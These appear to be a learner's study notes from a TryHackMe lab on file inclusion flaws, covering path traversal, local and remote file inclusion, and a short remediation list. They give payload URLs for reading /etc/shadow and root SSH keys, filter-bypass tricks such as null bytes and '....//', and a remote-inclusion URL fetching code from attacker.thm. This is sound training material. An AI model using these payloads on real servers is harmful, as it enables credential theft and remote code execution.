# File Inclusion:
-----------------
	- File inclusion is common vulnerability that enables you to retriver files, images, creds and more from the web server using the parameters like in such urls
		`https://tryhackme.com/get.php?file=../../etc/passwd`

# Path Traversal: => Is a vulnerability allow the attacker to read the web server resources, by editing the URLs to locat and access files or directories out side the application's root directory.
	
Path traversal vulnerabilities occur when the user's input is passed to a function such as file_get_contents in PHP. It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file_get_contents to read the content of a file. You can find more information about the function here.

- Path traversal attack also known as dot-dot-slash attack
- once the attacker discovers a valid parameter, he would try some payloads to test the resonse from the server.
- Url such as this 	`http://www.test.com/get.php?file=../../../etc/passwd`
	each ../ moves you a step up towards the root directory / 
- the same thing in windows, what differs is the files name and the paths
	in windows => `http://www.test.com/get.php?file=../../../../../../boot.ini`
				  `http://www.test.com/get.php?file=../../../../../../windows/win.ini`
- root directory is windows => c:\
- root direcroey in linux => /
- some important & critical files:
	1. /etc/issues
	2. /etc/passwd => have all the registrated users in the system
	3. /proc/version => the linux version kernel
	4. /etc/profile
	5. /etc/shadow => the user's passwords
	6. /root/.bash_history => the history commannds of the root user
	7. /var/log/dmessage
	8. /root/.ssh/id_rsa => contains all SSH keys for the root and the other users
	9. /var/log/apache2/access.log => logs of the apache server
	10. c:\boot.ini 



# Local File Inclusion
-----------------------
	- LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications. In this room, we'll be picking on PHP, but it's worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.

- LFI Tricks
------------
	1. when the developer adds a '.php' to the input file in the parameter, like when you input ../../../../etc/passwd, it will be modified to ../../../../etc/passwdd.php, in this case we need to bypass the .php using the null bytes which is %00 after the file name.

	the null byte tells the include function to ignore anything comes after it, so the payload would be:
		`http://tryhackme.com/index.php?lang=../../../../etc/passwd%00`

- sometimes the error messagge are very important, it can give you the whole file's path, or what is the include functiom looks like !

	2. Filtering the keywords  like /etc/passwd, you can bypass this by using:
				- Null bytes
				- ./ at the end of the file name => `/etc/passwd/.`
				./ => refers to the current directory

	3. Input validation:
		- replacing the ../ with empty string, we can bypass this using:
			`....//....//....//....//etc/passwd` => cause the php only match and replace the ../ 

	4.  When the developer forces the include function to read from a defind directory, we can bypas this by putting the defind directory at the first of the payload =>
		`/languages/../../../../etc/passwd`

# Remote File Inclusion RFI :
------------------------
	- RFI attack is like the LFI but in this case the attacker will inject an external URL in the `include` function, but in order to do that, the `allow_url_fopen` option needs  to be `ON`.
	- RFI can leads to RCE , XSS, DoS, information disclure

	Steps:
		First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.
		
		- ThisImage Explain EveryThing => `https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png`

# Redimation:
-------------
	
    1. Keep system and services, including web application frameworks, updated with the latest version.
    2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
    3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
    4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
    5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
    6. Never trust user input, and make sure to implement proper input validation against file inclusion.
    7. Implement whitelisting for file names and locations as well as blacklisting


# Notes:
	- LFI payloads can be injected in cookies
	- In RFI Exploitain use python http server:
		`python3 -m http.server`